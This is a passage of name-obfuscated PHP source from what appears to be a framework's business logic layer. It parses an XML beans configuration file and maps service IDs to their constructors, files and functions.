BusinessLogicLayerException(8, "BusinessLogicLayer->bean_objs[vars]")); if (!isset($this->modules_vars[$pcd8c70bc])) launch_exception(new BusinessLogicLayerException(8, "BusinessLogicLayer->modules_vars[$pcd8c70bc]")); $this->v10eb48c548["vars"] = array_merge($this->v10eb48c548["vars"], $this->modules_vars[$pcd8c70bc]); } public function getBeanObjs() {return $this->v10eb48c548;} private function ma015623caae8($pcd8c70bc, $pdc0a3686) { $pc5a892eb = array( "objs" => $this->v10eb48c548, "vars" => isset($this->modules_vars[$pcd8c70bc]) ? $this->modules_vars[$pcd8c70bc] : null ); $v19ed750c63 = new BeanSettingsFileFactory(); $v1e9dc98c41 = $v19ed750c63->getSettingsFromFile($pdc0a3686, $pc5a892eb); $pae77d38c = file_get_contents($pdc0a3686); $v538cb1a1f7 = get_lib("org.phpframework.xmlfile.schema.beans", "xsd"); $v50d32a6fc4 = XMLFileParser::parseXMLContentToArray($pae77d38c, $pc5a892eb, $pdc0a3686, $v538cb1a1f7); $pa266c7f5 = is_array($v50d32a6fc4) ? array_keys($v50d32a6fc4) : array(); $pa266c7f5 = isset($pa266c7f5[0]) ? $pa266c7f5[0] : null; $pdd397f0a = dirname($pdc0a3686) . "/"; $pade90f87 = isset($v50d32a6fc4[$pa266c7f5][0]["childs"]["services"][0]["childs"]["service"]) && is_array($v50d32a6fc4[$pa266c7f5][0]["childs"]["services"][0]["childs"]["service"]) ? $v50d32a6fc4[$pa266c7f5][0]["childs"]["services"][0]["childs"]["service"] : array(); $v1ce69f3b9f = array(); $pc37695cb = $pade90f87 ? count($pade90f87) : 0; for($v43dd7d0051 = 0; $v43dd7d0051 < $pc37695cb; $v43dd7d0051++) { $v1c90917628 = $pade90f87[$v43dd7d0051]; $v1cbfbb49c5 = XMLFileParser::getAttribute($v1c90917628, "id"); $pcee3c9fd = XMLFileParser::getAttribute($v1c90917628, "constructor"); $v7dffdb5a5b = XMLFileParser::getAttribute($v1c90917628, "file"); $v2f4e66e00a = XMLFileParser::getAttribute($v1c90917628, "function"); $v1efaf06c58 = XMLFileParser::getAttribute($v1c90917628, "namespace"); if (strpos($pcee3c9fd, "\\") !== false) { if (substr($pcee3c9fd, 0, 1) == "\\" && strpos($pcee3c9fd, "\\", 1) === false) $pcee3c9fd = substr($pcee3c9fd, 1); else if (substr($pcee3c9fd, 0, 1) != "\\" && strpos($pcee3c9fd, "\\") !== false) $pcee3c9fd = "\\" . $pcee3c9fd; } if (!empty($pcee3c9fd)) $v1ce69f3b9f[$v1cbfbb49c5] = array($v2f4e66e00a, $pcee3c9fd, 1, $v1efaf06c58); else if (!empty($v7dffdb5a5b)) $v1ce69f3b9f[$v1cbfbb49c5] = array($v2f4e66e00a, $pdd397f0a . $v7dffdb5a5b, 2, $v1efaf06c58); } return array("beans" => $v1e9dc98c41, "services" => $v1ce69f3b9f); } public function getServicesAlias($pdc0a3686, $pcd8c70bc = false) { $v70210c15fa = array(); if (!empty($pdc0a3686) && file_exists($pdc0a3686)) { $v1ce69f3b9f = $this->ma015623caae8($pcd8c70bc, $pdc0a3686); $v1e9dc98c41 = isset($v1ce69f3b9f["beans"]) ? $v1ce69f3b9f["beans"] : null; $v1ce69f3b9f = isset($v1ce69f3b9f["services"]) ? $v1ce69f3b9f["services"] : null; $pa32be502 = dirname($pdc0a3686) . "/"; foreach ($v1ce69f3b9f as $v1cbfbb49c5 => $v95eeadc9e9) { $v2f4e66e00a = isset($v95eeadc9e9[0]) ? $v95eeadc9e9[0] : null; $pcee3c9fd = isset($v95eeadc9e9[1]) ? $v95eeadc9e9[1] : null; $v3fb9f41470 = isset($v95eeadc9e9[2]) ? $v95eeadc9e9[2] : null; if ($v3fb9f41470 != 2) { $pf3dc0762 = $pa32be502 . $pcee3c9fd . ".php"; $v70210c15fa[ $pf3dc0762 ][$pcee3c9fd][$v2f4e66e00a][] = $v1cbfbb49c5; } else { $pf3dc0762 = $pcee3c9fd; $v70210c15fa[ $pcee3c9fd ][0][$v2f4e66e00a][] = $v1cbfbb49c5; } } } return $v70210c15fa; } } ?>
